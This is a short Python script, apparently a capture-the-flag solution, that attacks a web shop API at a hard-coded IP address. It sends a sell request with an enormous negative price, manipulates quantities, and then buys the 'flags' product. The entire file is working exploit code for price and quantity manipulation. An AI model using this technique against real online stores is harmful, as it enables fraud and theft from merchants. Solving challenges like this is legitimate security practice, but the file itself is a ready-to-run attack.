import requests
import re
import html

URL="http://206.189.236.145:3000"
# URL="http://localhost:3000"

s = requests.session()

res = s.post(URL+"/api/v1/sell", json={"digispark": {"price": -100000000000000000000000000000000000000000000000}})
print(res.text)
print(s.cookies.get_dict())

print("-----")

res = s.post(URL+"/api/v1/sell", json={"digispark": {"quantity": 100}})
print(res.text)
print(s.cookies.get_dict())

print("-----")

res = s.get(URL+"/")
print(re.findall("Get flags.*", html.unescape(res.text)))
print(re.findall("You have.*", html.unescape(res.text)))

res = s.post(URL+"/api/v1/buy", json={"product": "digispark", "quantity":1})
print(res.text)
print(s.cookies.get_dict())

print("-----")

res = s.get(URL+"/")
print(re.findall("digispark.*", html.unescape(res.text)))
print(re.findall("Get flags.*", html.unescape(res.text)))
print(re.findall("You have.*", html.unescape(res.text)))

print("-----")

res = s.post(URL+"/api/v1/buy", json={"product": "flags", "quantity":1})
print(res.text)

